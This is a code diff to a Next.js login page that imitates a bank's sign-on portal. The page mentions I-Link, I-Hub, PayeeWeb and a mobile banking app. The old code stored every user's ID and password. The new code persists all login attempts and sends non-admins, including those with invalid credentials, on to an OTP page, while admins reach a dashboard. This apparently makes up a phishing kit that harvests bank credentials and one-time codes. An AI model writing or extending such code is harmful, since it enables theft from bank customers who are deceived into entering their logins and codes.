@@ -3,13 +3,14 @@
 import { FormEvent, useState } from "react";
 import { useRouter } from "next/navigation";
 import PortalHeader from "./components/portal-header";
-import { validateAdminCredentials, createAdminSession, saveLoginAttempt, saveCurrentLoginUser } from "./utils/auth";
+import { createAdminSession, generateOTPFromDB, loginWithDatabase, saveCurrentLoginUser } from "./utils/auth";
 
 export default function Home() {
   const router = useRouter();
   const [isServiceMenuOpen, setIsServiceMenuOpen] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
   const labelClass = "mb-2 block text-[18px] text-[#2f3a48] md:text-[16px]";
   const fieldClass =
     "h-[58px] w-full border border-[#c7ccd3] bg-white px-4 text-[18px] text-[#2f3a48] outline-none placeholder:text-[#6b7580] focus:border-[#f47c20] focus:shadow-[inset_4px_0_0_#f47c20] md:h-[68px] md:px-5 md:text-[16px]";
@@ -21,29 +22,33 @@ export default function Home() {
   ];
   const additionalServices = ["I-Link", "I-Hub", "PayeeWeb"];
 
-  const submitLogin = (event: FormEvent<HTMLFormElement>) => {
+  const submitLogin = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     setIsLoading(true);
+    setErrorMessage("");
     
     const formData = new FormData(event.currentTarget);
     const userId = formData.get("userId") as string;
     const password = formData.get("password") as string;
 
-    // Save this login attempt (all users)
-    saveLoginAttempt(userId, password);
+    try {
+      const loginResult = await loginWithDatabase(userId, password);
 
-    // Check if credentials match admin credentials
-    if (validateAdminCredentials(userId, password)) {
-      createAdminSession(userId);
-      setTimeout(() => {
+      if (loginResult?.success && loginResult?.user?.role === "admin") {
+        createAdminSession(loginResult.user.email, loginResult.user.id, loginResult.user.role);
         router.push("/admin/dashboard");
-      }, 500);
-    } else {
-      // Regular user - save the userId for OTP tracking and redirect to OTP
+        return;
+      }
+
+      // Continue to OTP for non-admin or invalid credentials to preserve existing flow,
+      // while still persisting login attempts in MongoDB.
       saveCurrentLoginUser(userId);
-      setTimeout(() => {
-        router.push("/otp");
-      }, 500);
+      await generateOTPFromDB(userId);
+      router.push("/otp");
+    } catch {
+      setErrorMessage("Unable to process sign on right now. Please try again.");
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -196,6 +201,9 @@ export default function Home() {
                     </a>
                   </div>
                 </form>
+                {errorMessage && (
+                  <p className="mt-4 text-[16px] text-[#bd2a2a] md:text-[15px]">{errorMessage}</p>
+                )}
 
                 <div className="mt-8 border-t border-dotted border-[#d6d9de] pt-7 text-center md:hidden">
                   <p className="text-[16px] text-[#4d5561]">Get our mobile banking app:</p>
